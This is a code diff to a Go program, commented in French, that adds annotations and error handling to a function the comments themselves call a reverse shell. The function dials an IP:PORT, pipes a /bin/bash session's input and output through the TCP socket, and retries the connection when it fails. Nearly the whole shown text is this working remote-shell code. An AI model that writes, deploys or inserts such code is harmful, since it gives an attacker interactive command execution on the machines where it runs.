@@ -8,27 +8,38 @@ import (
 	"time"
 )
 
+/*
+La fonction shell est ici pour faire du reverse shell, le parametre de la fonction est au format IP:PORT
+*/
 func shell(host string) {
 
-	conn, err := net.Dial("tcp", host)
-	if err != nil {
+	//stdin := os.Stdin
+	stderr := os.Stderr
+	stdout := os.Stdout
+
+	conn, err := net.Dial("tcp", host) // appell TCP sur l'ip:port
+	if err != nil {                    // verification des erreurs
 		if nil != conn {
-			conn.Close()
+			conn.Close() // ferme la connexion si err == nil et que la connexion est initialisee, permet de fermer proprement
 		}
-		for i := 1; i <= 5; i++ {
-			fmt.Println("ERREUR - Connexion a l'hote impossible")
+		for i := 1; i <= 5; i++ { // la boucle ici pernet de relancer une connexion si cela echoue 5 tentatives avant de fermer la connexion
+			fmt.Fprintf(stderr, "ERREUR - Connexion a l'hote impossible\n")
 			time.Sleep(5 * time.Second)
 			shell(host)
 		}
-		fmt.Println("ECHEC - Connexion a l'hote impossible")
-		os.Exit(1)
+		fmt.Fprintf(stderr, "ECHEC - Connexion a l'hote impossible apres 5 essais\n")
+		os.Exit(1) // EXIT == 1 - Exit avec erreur
 	}
-	fmt.Println("Connexion Reussie")
-	sh := exec.Command("/bin/bash")
-	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
-	sh.Run()
-	conn.Close()
-	fmt.Println("Connexion Fermee")
+	fmt.Fprintf(stdout, "Connexion Reussie\n")
+
+	sh := exec.Command("/bin/bash")                   // Execution d'un shell Bash
+	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn // multiples affectations des Std{in,out,err} aux pointeur conn pour tout rediriger dans le socket
+	sh.Run()                                          // execution du shell avec les redirections ci-dessus
+
+	conn.Close() // fermeture de la connexion lorsque le shell se ferme
+
+	fmt.Fprintf(stdout, "Connexion Fermee\n")
+	os.Exit(0) // EXIT == 0 - Exit sans erreur
 
 }
 
